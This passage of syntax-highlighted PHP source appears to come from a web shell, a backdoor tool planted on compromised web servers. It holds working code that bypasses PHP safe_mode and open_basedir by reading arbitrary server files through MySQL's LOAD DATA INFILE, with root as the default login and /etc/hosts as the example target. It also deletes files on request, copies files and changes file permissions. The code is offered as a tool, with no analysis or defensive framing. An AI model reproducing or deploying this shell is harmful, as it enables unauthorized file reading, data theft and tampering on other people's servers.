class="s2">&quot;&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1017</span> <span class="p">}</span><span class="c1">#end of for</span>
<span class="lineno">1018</span> <span class="k">print</span> <span class="s2">&quot;&lt;/table&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1019</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1020</span> <span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1021</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno">1022</span> <span class="p">}</span><span class="c1">#end of ps table</span>
<span class="lineno">1023</span> 
<span class="lineno">1024</span> 
<span class="lineno">1025</span> <span class="nv">$read_file_safe_mode</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;read_file_safe_mode&#39;</span><span class="p">];</span>
<span class="lineno">1026</span> <span class="k">if</span><span class="p">(</span><span class="nv">$read_file_safe_mode</span><span class="p">){</span>
<span class="lineno">1027</span> 
<span class="lineno">1028</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">])){</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;root&quot;</span><span class="p">;}</span>
<span class="lineno">1029</span> 
<span class="lineno">1030</span> <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno">1031</span> <span class="s2">Read file content using MySQL - when &lt;b&gt;safe_mode&lt;/b&gt;, &lt;b&gt;open_basedir&lt;/b&gt; is &lt;font color=green&gt;ON&lt;/font&gt;&lt;Br&gt;</span>
<span class="lineno">1032</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno">1033</span> <span class="s2">&lt;table&gt;</span>
<span class="lineno">1034</span> <span class="s2">&lt;tr&gt;&lt;td&gt;Addr:&lt;/td&gt;&lt;Td&gt; &lt;input name=serv_ip value=&#39;127.0.0.1&#39;&gt;&lt;input name=port value=&#39;3306&#39; size=6&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1035</span> <span class="s2">&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input name=l value=&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1036</span> <span class="s2">&lt;tr&gt;&lt;td&gt;Passw:&lt;/td&gt;&lt;td&gt;&lt;input name=p value=&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span class="lineno">1037</span> <span class="s2">(example: /etc/hosts)&lt;br&gt;</span>
<span class="lineno">1038</span> <span class="s2">&lt;input name=read_file size=45&gt;&lt;br&gt;</span>
<span class="lineno">1039</span> <span class="s2">&lt;input type=submit value=&#39;Show content&#39;&gt;</span>
<span class="lineno">1040</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno">1041</span> <span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1042</span> 
<span class="lineno">1043</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;read_file&#39;</span><span class="p">]){</span>
<span class="lineno">1044</span> <span class="nv">$read_file</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;read_file&#39;</span><span class="p">];</span>
<span class="lineno">1045</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;serv_ip&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;l&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1046</span> <span class="nb">mysql_create_db</span><span class="p">(</span><span class="s2">&quot;tmp_bd_file&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1047</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;tmp_bd_file&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1048</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">&#39;CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1049</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;LOAD DATA INFILE </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$read_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> INTO TABLE tmp_file&quot;</span><span class="p">);</span>
<span class="lineno">1050</span> <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM tmp_file&quot;</span><span class="p">;</span>
<span class="lineno">1051</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1052</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;File content&lt;/b&gt;:&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1053</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">1054</span> <span class="nv">$name</span><span class="o">=</span><span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);}</span>
<span class="lineno">1055</span> <span class="k">while</span><span class="p">(</span><span class="nv">$line</span><span class="o">=</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">)){</span>
<span class="lineno">1056</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$line</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span><span class="nv">$col_value</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1057</span> <span class="k">print</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$col_value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}}</span>
<span class="lineno">1058</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno">1059</span> <span class="nb">mysql_drop_db</span><span class="p">(</span><span class="s2">&quot;tmp_bd_file&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1060</span> <span class="p">}</span>
<span class="lineno">1061</span> 
<span class="lineno">1062</span> 
<span class="lineno">1063</span> <span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1064</span> <span class="k">die</span><span class="p">;</span>
<span class="lineno">1065</span> <span class="p">}</span><span class="c1">#end of read_file_safe_mode</span>
<span class="lineno">1066</span> 
<span class="lineno">1067</span> 
<span class="lineno">1068</span> <span class="c1"># sys</span>
<span class="lineno">1069</span> <span class="nv">$wich_f</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;wich_f&#39;</span><span class="p">];</span>
<span class="lineno">1070</span> <span class="nv">$delete</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">];</span>
<span class="lineno">1071</span> <span class="nv">$del_f</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;del_f&#39;</span><span class="p">];</span>
<span class="lineno">1072</span> <span class="nv">$chmod</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;chmod&#39;</span><span class="p">];</span>
<span class="lineno">1073</span> <span class="nv">$ccopy_to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ccopy_to&#39;</span><span class="p">];</span>
<span class="lineno">1074</span> 
<span class="lineno">1075</span> 
<span class="lineno">1076</span> <span class="c1"># delete</span>
<span class="lineno">1077</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;del_f&#39;</span><span class="p">]){</span>
<span class="lineno">1078</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$delete</span><span class="p">)){</span>
<span class="lineno">1079</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=red&gt;Delete this file?&lt;/font&gt;&lt;br&gt;</span>
<span class="lineno">1080</span> <span class="s2">&lt;b&gt;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2">&lt;br&gt;&lt;br&gt;&lt;/b&gt;</span>
<span class="lineno">1081</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=</span><span class="si">$wich_f</span><span class="s2">&amp;delete=1&#39;&gt;Yes&lt;/a&gt; / &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&gt;No&lt;/a&gt;</span>
<span class="lineno">1082</span> <span class="s2">&quot;</span><span class="p">;}</span>
<span class="lineno">1083</span> <span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
<span class="lineno">1084</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$del_f</span><span class="p">);</span>
<span class="lineno">1085</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;File: &lt;font color=green&gt;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$del_f</span><span class="s2"> DELETED!&lt;/font&gt;&lt;/b&gt;</span>
<span class="lineno">1086</span> <span class="s2">&lt;br&gt;&lt;b&gt; &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&gt;# BACK&lt;/a&gt;</span>
<span class="lineno">1087</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1088</span> <span class="p">}</span>
<span class="lineno">1089</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1090</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1091</span> <span class="p">}</span>
<span class="lineno">1092</span> 
<span class="lineno">1093</span> 
<span class="lineno">1094</span> <span class="c1"># copy to</span>
<span class="lineno">1095</span> <span class="k">if</span><span class="p">(</span><span class="nv">$ccopy_to</span><span class="p">){</span>
<span class="lineno">1096</span> <span class="nv">$wich_f</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;wich_f&#39;</span><span class="p">];</span>
<span class="lineno">1097</span> <span class="nv">$to_f</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to_f&#39;</span><span class="p">];</span>
<span class="lineno">1098</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=green&gt;Copy file:&lt;br&gt;</span>
<span class="lineno">1099</span> <span class="si">$d</span><span class="s2">/</span><span class="si">$ccopy_to</span><span class="s2">&lt;/font&gt;&lt;br&gt;</span>
<span class="lineno">1100</span> <span class="s2">&lt;br&gt;</span>
<span class="lineno">1101</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno">1102</span> <span class="s2">File:&lt;br&gt;&lt;input name=wich_f size=100 value=&#39;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$ccopy_to</span><span class="s2">&#39;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">1103</span> <span class="s2">To:&lt;br&gt;&lt;input name=to_f size=100 value=&#39;</span><span class="si">$d</span><span class="s2">/nst_</span><span class="si">$ccopy_to</span><span class="s2">&#39;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">1104</span> <span class="s2">&lt;input type=submit value=Copy&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="lineno">1105</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1106</span> 
<span class="lineno">1107</span> <span class="k">if</span><span class="p">(</span><span class="nv">$to_f</span><span class="p">){</span>
<span class="lineno">1108</span> <span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$wich_f</span><span class="p">,</span><span class="nv">$to_f</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;Cannot copy!!! maybe folder is not writable&lt;/font&gt;&quot;</span><span class="p">);</span>
<span class="lineno">1109</span> <span class="k">print</span> <span class="s2">&quot;&lt;font color=green&gt;&lt;b&gt;Copy success!!!&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1110</span> <span class="p">}</span>
<span class="lineno">1111</span> 
<span class="lineno">1112</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">1113</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno">1114</span> <span class="p">}</span>
<span class="lineno">1115</span> 
<span class="lineno">1116</span> 
<span class="lineno">1117</span> <span class="c1"># chmod</span>
<span class="lineno">1118</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;chmod&#39;</span><span class="p">]){</span>
<span class="lineno">1119</span> <span class="nv">$perms</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$wich_f</span><span class="p">);</span>
<span class="lineno">1120</span> <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;&lt;font color=green&gt;CHMOD file </span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2">&lt;/font&gt;&lt;br&gt;</span>
<span class="lineno">1121</span> <span class="s2">&lt;br&gt;&lt;center&gt;This file chmod is&lt;/b&gt; &quot;</span><span class="p">;</span>
<span class="lineno">1122</span> <span class="k">print</span> <span class="nx">perm</span><span class="p">(</span><span class="nv">$perms</span><span class="p">);</span>
<span class="lineno">1123</span> <span class="k">print</span> <span class="s2">&quot;&lt;/center&gt;</span>
<span class="lineno">1124</span> <span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1125</span> <span class="nv">$chmd</span><span class="o">=&lt;&lt;&lt;</span><span class="nx">HTML</span>
<span class="lineno">1126</span> 
<span class="lineno">1127</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="lineno">1128</span> <span class="o">&lt;!--</span>
<span class="lineno">1129</span> 
<span class="lineno">1130</span> <span class="k">function</span> <span class="nf">do_chmod</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1131</span>         <span class="k">var</span> <span class="nx">field4</span> <span class="o">=</span> <span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;4&quot;</span><span class="p">;</span>
<span class="lineno">1132</span>         <span class="k">var</span> <span class="nx">field2</span> <span class="o">=</span> <span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;2&quot;</span><span class="p">;</span>
<span class="lineno">1133</span>         <span class="k">var</span> <span class="nx">field1</span> <span class="o">=</span> <span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="lineno">1134</span>         <span class="k">var</span> <span class="nx">total</span> <span class="o">=</span> <span class="s2">&quot;t_&quot;</span> <span class="o">+</span> <span class="nx">user</span><span class="p">;</span>
<span class="lineno">1135</span>         <span class="k">var</span> <span class="nx">symbolic</span> <span class="o">=</span> <span class="s2">&quot;sym_&quot;</span> <span class="o">+</span> <span class="nx">user</span><span class="p">;</span>
<span class="lineno">1136</span>         <span class="k">var</span> <span class="nx">number</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1137</span>         <span class="k">var</span> <span class="nx">sym_string</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1138</span> 
<span class="lineno">1139</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field4</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1140</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field2</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1141</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field1</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1142</span> 
<span class="lineno">1143</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field4</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1144</span>                 <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;r&quot;</span><span class="p">;</span>
<span class="lineno">1145</span>         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1146</span>                 <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">1147</span>         <span class="p">}</span>
<span class="lineno">1148</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field2</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1149</span>                 <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;w&quot;</span><span class="p">;</span>
<span class="lineno">1150</span>         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1151</span>                 <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">1152</span>         <span class="p">}</span>
<span class="lineno">1153</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field1</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1154</span>                 <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;x&quot;</span><span class="p">;</span>
<span class="lineno">1155</span>         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1156</span>                 <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span>
<span class="lineno">1157</span>         <span class="p">}</span>
<span class="lineno">1158</span> 
<span class="lineno">1159</span>         <span class="k">if</span> <span class="p">(</span><span class="nx">number</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1160</span>         <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">total</span><span class="p">]</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">number</span><span class="p">;</span>
<span class="lineno">1161</span>         <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">symbolic</span><span class="p">]</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sym_string</span><span class="p">;</span>
<span class="lineno">1162</span> 
<span class="lineno">1163</span>         <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_total</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_owner</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_group</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_other</span><span class="o">.</span><span class="nx">value</span><span class="p">;</span>
<span class="lineno">1164</span>         <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_total</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_owner</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_group</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_other</span><span class="o">.</span><span class="nx">value</span><span class="p">;</span>
<span class="lineno">1165</span> <span class="p">}</span>
<span class="lineno">1166</span> <span class="c1">//--&gt;</span>
<span class="lineno">1167</span> <span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="lineno">1168</span> 
<span class="lineno">1169</span> 
<span class="lineno">1170</span> 
<span class="lineno">1171</span> <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;chmod&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span><span class="o">&gt;</span>
<span class="lineno">1172</span> <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&lt;</span><span class="nx">table</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;silver&quot;</span><span class="o">&gt;&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">valign</span><span class="o">=</span><span class="s2">&quot;top&quot;</span><span class="o">&gt;&lt;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="s2">&quot;5&quot;</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="o">&gt;&lt;</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">td</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#008000&quot;</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">colspan</span><span class="o">=</span><span class="s2">&quot;5&quot;</span><span class="o">&gt;&lt;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">CHMOD</span> <span class="p">(</span><span class="nx">File</span> <span class="nx">Permissions</span><span class="p">)</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">font</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;&lt;/</span><span class="nx">tr</span><span class="o">&gt;</span>
<span class="lineno">1173</span>         <span class="o">&lt;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;gray&quot;</span><span class="o">&gt;</span>
<span class="lineno">1174</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Permission</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1175</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Owner</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1176</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Group</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1177</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Other</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1178</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span> <span class="nx">rowspan</span><span class="o">=</span><span class="s2">&quot;4&quot;</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
<span class="lineno">1179</span>         <span class="o">&lt;/</span><span class="nx">tr</span><span class="o">&gt;&lt;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&gt;</span>
<span class="lineno">1180</span>                 <span class="o">&lt;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">nowrap</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Read</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">td</span><span class="o">&gt;</span>
